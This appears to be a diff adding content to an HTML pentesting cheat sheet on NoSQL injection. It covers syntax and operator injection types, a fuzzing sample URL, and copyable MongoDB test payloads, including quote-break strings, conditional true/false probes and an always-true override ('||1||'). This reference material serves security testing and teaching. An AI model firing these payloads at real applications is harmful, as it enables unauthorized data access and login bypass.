@@ -37,12 +37,77 @@
 NoSQL databases are different than the normal SQL databases. The structure is different so the way to query the DB will
 differ. The structure of NoSQL DB is <b>[key:pair]</b> structure.
 
+<b>FUZZING</b> is the most common attack for this !!
+
+<b>SAMPLE:</b> https://machetevault.com/product/lookup?category=FUZZ
+
 <b>Possible DBS:</b> mongoDB, redis, couch DB & more.
 
+<b>Two types:</b> 
+	
+1. Syntax Injection: It is when you can break the query.
+2. Operator Injection: It is when you can use operators to manipulate the queries.
+
+</details>	
+<details>
+<summary>COMMON TESTS</summary>
+
+<b>NOTES:</b> 
+
+1. Inspection of requests is needed. [burpsuite]
+2. Techniques used for SQL Injection can be used, it will differ the parameters and more but logic can be adapted.
+3. Use URL/JSON encoding when needed.
+	
+<b>C1: </b><mark id="CTNOSQL01">'</mark>
+<b>C2: </b><mark id="CTNOSQL01">'+'</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CTNOSQL01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CTNOSQL01')">.C1.</button>
+
+Simple quote <b>(')</b> is used to determine which characters are interpreted as syntax, it is important to check requests/response
+before and after and compare it. In order to escape queries the slash can be used. <b>(\)</b>
+<b>SAMPLE:</b> this.car == '\''
+
+<b>:::: MONGO DB</b>
+
+<b>C1: </b><mark id="NOSQL01">
+'"`{
+;$Foo}
+$Foo \xYZ</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#NOSQL01')">.C1.</button> 
+
+<b>:::: CONDITIONAL BEHAVIOR</b>
+
+<b>NOTE:</b> inspection of requests/response is needed. [burpsuite]
+
+<b>C1: FALSE</b><mark id="NOSQL02">' && 0 && 'x</mark>
+<b>C2: TRUE</b><mark id="NOSQL03">' && 1 && 'x</mark>
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#NOSQL02')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#NOSQL03')">.C2.</button> 
+
+<b>:::: OVERRIDING CONDITIONS</b>
+
+<b>NOTE:</b> this method is always <b>TRUE.</b>
+	
+<b>C1: </b><mark id="NOSQL04">'||1||'</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#NOSQL04')">.C1.</button>	
+
+</details>	
+<details>
+<summary>NoSQL OPERATORS</summary>
 
 
-  
-</details>		
+	
+
+
+</details>
+
+
+
+
+
+
 	
 </div>
 </pre>
